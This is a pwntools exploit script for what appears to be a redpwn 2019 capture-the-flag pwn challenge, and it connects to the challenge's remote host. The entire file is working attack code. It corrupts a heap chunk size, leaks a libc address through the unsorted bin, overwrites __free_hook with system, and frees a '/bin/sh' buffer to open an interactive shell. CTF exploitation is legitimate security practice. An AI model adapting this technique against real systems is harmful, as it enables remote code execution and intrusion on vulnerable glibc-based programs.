from pwn import *


###Util
def create(size):
    r.sendlineafter('me: ','1')
    r.sendlineafter('greet? : ',str(size))

def show(size):
    r.sendlineafter('me: ','2')
    r.sendlineafter('writ? : ',str(size))
    return r.recv(size)

def overwrite():
    r.sendlineafter('me: ','3')

def edit(data):
    r.sendlineafter('me: ','4')
    r.sendlineafter('Pizza: ',data)

def delete():
    r.sendlineafter('me: ','5')

###Addr
main_arena_offset = 0x1b0780
unsorted_bin_offset = main_arena_offset+0x30
free_hook_offset = 0x1b18b0
system_offset = 0x3a940

###Exp
r = remote('chall.2019.redpwn.net',4006)
#r = process('dennis',aslr=False)
create(0xfc)
edit(b'\x00'*0xfc+b'\x01\x0f\x00\x00')
create(0xffc)
create(0xeec)
print(show(16))
unsorted_bin_addr = u32(show(4))
libc_base = unsorted_bin_addr-unsorted_bin_offset
print(hex(libc_base))
edit(p32(libc_base+system_offset)+p32(libc_base+free_hook_offset))
overwrite()
edit('/bin/sh\x00')
delete()

r.interactive()
